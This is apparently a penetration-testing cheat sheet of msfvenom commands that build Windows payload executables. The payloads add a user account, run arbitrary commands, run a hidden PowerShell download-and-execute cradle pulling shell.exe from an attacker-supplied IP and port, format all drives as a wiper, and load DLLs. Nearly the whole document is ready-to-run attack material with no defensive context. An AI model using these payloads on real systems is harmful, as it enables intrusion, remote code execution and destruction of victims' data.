# Exec Payloads

## 01 - Add User Windows Exec Payload

### 1.1 - x86 (32-bit) Payloads

```
$ msfvenom -p windows/adduser user=<username> pass=Password1234! wmic=[true | false] custom=<group_name>
```

## 02 - DNS TXT Query Exec Windows Payload

### 2.1 - x86 (32-bit) Payloads

```
$ msfvenom -p windows/dns_txt_query_exec dnszone=<domain.com> -f exe -o dns-query-x86.exe
```

## 03 - Execute Windows Exec Payload

### 3.1 - x86 (32-bit) Payloads

```
$ msfvenom -p windows/exec cmd=<commands> -f exe -o exec-x86.exe
```

### 3.2 - x86-64 (64-bit) Payloads

```
$ msfvenom -p windows/x64/exec cmd=<commands> -f exe -o exec-x64.exe

$ msfvenom -p windows/x64/exec cmd="powershell.exe -w hidden -noni -nop -c \"IEX (new-object net.webclient).downloadfile('http://<IP>:<PORT>/shell.exe', 'C:\Windows\Temp\shell.exe');start-process C:\Windows\Temp\shell.exe\"" -f exe -o exec-x64.exe
```

## 04 - Text-To-Speech Windows Exec Payload

```
$ msfvenom -p windows/speak_pwned -f exe -o speak-x86.exe
```

## 05 - Format All Drives Windows Exec Payload

```
$ msfvenom -p windows/format_all_drives volumelabel=<label> -f exe -o wiper-x86.exe
```

## 06 - Messagebox Windows Exec Payload

### 6.1 - x86 (32-bit) Payloads

```
$ msfvenom -p windows/messagebox exitfunc=<seh | thread | process | none> icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> title=<title> text=<text> -f exe -o msgbox-x86.exe
```

### 6.2 - x86-64 (64-bit) Payloads

```
$ msfvenom -p windows/x64/messagebox exitfunc=<seh | thread | process | none> icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> title=<title> text=<text> -f exe -o msgbox-x64.exe
```

## 07 - LoadLibrary Windows Exec Payload

### 7.1 - x86 (32-bit) Payloads

```
$ msfvenom -p windows/loadlibrary exitfunc=<seh | thread | process | none> dll=C:\\path\\to\\file.dll -f exe -o load-dll-x86.exe
```

### 7.2 - x86-64 (64-bit) Payloads

```
$ msfvenom -p windows/x64/loadlibrary exitfunc=<seh | thread | process | none> dll=C:\\path\\to\\file.dll -f exe -o load-dll-x64.exe
```